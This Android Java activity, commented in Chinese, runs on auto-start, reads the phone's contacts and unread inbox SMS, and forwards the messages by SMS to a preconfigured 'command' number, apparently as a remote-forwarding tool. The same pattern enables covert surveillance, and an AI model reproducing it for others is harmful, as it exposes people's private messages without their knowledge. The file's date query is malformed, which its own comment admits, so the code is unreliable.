package my.pro;

import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.provider.ContactsContract;
import android.text.method.ScrollingMovementMethod;
import android.widget.TextView;

public class AutoStartActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		// TODO Auto-generated method stub
		super.onCreate(savedInstanceState);
		setContentView(R.layout.autostart);

		// 自动启动后，先把之前的未读短信转发，由该线程执行
		smsHandler.post(smsRunnable);
	}

	Handler smsHandler = new Handler();

	Runnable smsRunnable = new Runnable() {

		@Override
		public void run() {
			// TODO Auto-generated method stub

			SharedPreferences sharedPrefe = getSharedPreferences("parameters", Context.MODE_PRIVATE);
			// 第二个参数的含义：Value to return if this preference does not exist.
			long restartTime = sharedPrefe.getLong("cancelTime", 0);

			if (restartTime == 0) {
				// --------------自动发短信-----------------------//
				TextView myShowStr = (TextView) findViewById(R.id.widget33);
				// 设置TextView的滚动条
				myShowStr.setMovementMethod(ScrollingMovementMethod.getInstance());

				Cursor contactCursor = null;
				Cursor smsCursor = null;
				Cursor messageCursor = null;
				try {

					// 联系人列表
					contactCursor = managedQuery(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

					// 短信列表参数
					Uri uri = Uri.parse("content://sms//inbox");
					String[] projection = new String[] { "_id", "read", "address", "person", "body" };
					String selection = "read = 0";
					// 短信列表，用于查找发送指令的手机号码
					smsCursor = managedQuery(uri, projection, selection, null, "date desc");
					// 获取未读短信,Cursor指针一定要注意。读取列表时，一定要却表游标在开始位置
					messageCursor = managedQuery(uri, projection, selection, null, "date desc");

					// 读取设置的密码

					String getPassword = sharedPrefe.getString("password", "");

					
					String sendToPhone = sharedPrefe.getString("commandnumber", "");

					// 读取未读短信
					ReadSMS readSMS = new ReadSMS();
					StringBuilder strSMS = new StringBuilder();
					strSMS = readSMS.smsNumber(messageCursor, contactCursor, getPassword);

					// 发送短信
					SendSMS sendSMSToPhone = new SendSMS();
					sendSMSToPhone.sendSMS(strSMS.toString(), sendToPhone);

					// --------------------------------------------//
				} catch (Exception ex) {
					myShowStr.setText(ex.toString());
				} finally {
					smsCursor.close();
					messageCursor.close();
					contactCursor.close();
					System.exit(0);

				}
			} else {

				// 当发送过取消指令后，再次启动应用时进行的转发

				// --------------自动发短信-----------------------//
				TextView myShowStr = (TextView) findViewById(R.id.widget33);
				// 设置TextView的滚动条
				myShowStr.setMovementMethod(ScrollingMovementMethod.getInstance());

				Cursor contactCursor = null;
				Cursor smsCursor = null;
				Cursor messageCursor = null;
				try {

					// 联系人列表
					contactCursor = managedQuery(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

					// 短信列表参数
					Uri uri = Uri.parse("content://sms//inbox");
					String[] projection = new String[] { "date", "read", "address", "person", "body" };
					
					//判断条件不可用，restartTime是long类型的，超出条件可以比较的范围。
					String selection = "date>?" + restartTime;
					
					
					// 短信列表，用于查找发送指令的手机号码
					smsCursor = managedQuery(uri, projection, selection, null, "date desc");
					// 获取未读短信,Cursor指针一定要注意。读取列表时，一定要却表游标在开始位置
					messageCursor = managedQuery(uri, projection, selection, null, "date desc");

					// 读取设置的密码

					String getPassword = sharedPrefe.getString("password", "");

					// 获取发送指令的手机号码
					// SearchPhoneNumber searchPhoneNum = new
					// SearchPhoneNumber();
					// String sendToPhone =
					// searchPhoneNum.getPhoneNumber(smsCursor, getPassword);
					String sendToPhone = sharedPrefe.getString("commandnumber", "");

					// 读取未读短信
					ReadSMS readSMS = new ReadSMS();
					StringBuilder strSMS = new StringBuilder();
					strSMS = readSMS.smsNumber(messageCursor, contactCursor, getPassword);

					// 发送短信
					SendSMS sendSMSToPhone = new SendSMS();
					sendSMSToPhone.sendSMS(strSMS.toString(), sendToPhone);

					// --------------------------------------------//
				} catch (Exception ex) {
					myShowStr.setText(ex.toString());
				} finally {
					smsCursor.close();
					messageCursor.close();
					contactCursor.close();
					System.exit(0);

				}

			}

		}

	};

}
